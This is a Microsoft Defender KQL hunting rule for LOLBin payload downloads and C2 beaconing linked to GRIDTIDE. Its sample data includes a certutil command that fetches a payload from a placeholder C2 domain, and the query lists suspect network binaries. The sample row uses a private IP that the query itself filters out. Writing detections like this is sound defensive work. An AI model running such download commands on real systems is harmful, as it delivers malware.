# Name
GRIDTIDE - Network Reconnaissance and C2 Beaconing via LOLBins

# Description
Threat actors like GRIDTIDE frequently abuse Living-off-the-Land Binaries (LOLBins) like curl.exe, certutil.exe, or powershell.exe to pull secondary payloads from remote infrastructure or establish Command and Control (C2) beaconing, thereby blending in with legitimate administrative traffic.

# References
- https://cloud.google.com/blog/topics/threat-intelligence/disrupting-gridtide-global-espionage-campaign

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- GRIDTIDE

# MITRE ATT&CK
- T1105 (Ingress Tool Transfer)
- T1071.001 (Application Layer Protocol: Web Protocols)

# Data Sources
- Microsoft Defender XDR
   - DeviceNetworkEvents
   - DeviceProcessEvents

# Query
## Query 1

```kql
let DeviceNetworkEvents = datatable(
    Timestamp: datetime,
    DeviceId: string,
    DeviceName: string,
    ActionType: string,
    RemoteIP: string,
    RemoteUrl: string,
    RemotePort: int,
    InitiatingProcessFileName: string,
    InitiatingProcessCommandLine: string,
    AccountName: string
)
[
    // Case 1: Certutil reaching out to a suspicious domain
    datetime(2024-02-25 14:00:00), "device-guid-1", "Srv-App01.contoso.com", "ConnectionSuccess",
    "192.168.100.50", "malicious-c2.com", 443, "certutil.exe", "certutil.exe -urlcache -split -f https://malicious-c2.com/payload.bin payload.exe", "SYSTEM"
];
// Usage: Identify system utilities making abnormal external network connections
let SuspectNetworkBinaries = dynamic(["certutil.exe", "curl.exe", "wget.exe", "bitsadmin.exe", "mshta.exe", "wscript.exe", "cscript.exe"]);
DeviceNetworkEvents
| where ActionType in~ ("ConnectionSuccess", "ConnectionAttempt")
| where InitiatingProcessFileName in~ (SuspectNetworkBinaries)
// Ensure we are looking at external IP addresses (excluding private IP ranges)
| where ipv4_is_private(RemoteIP) == false
| project Timestamp, DeviceName, AccountName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
```
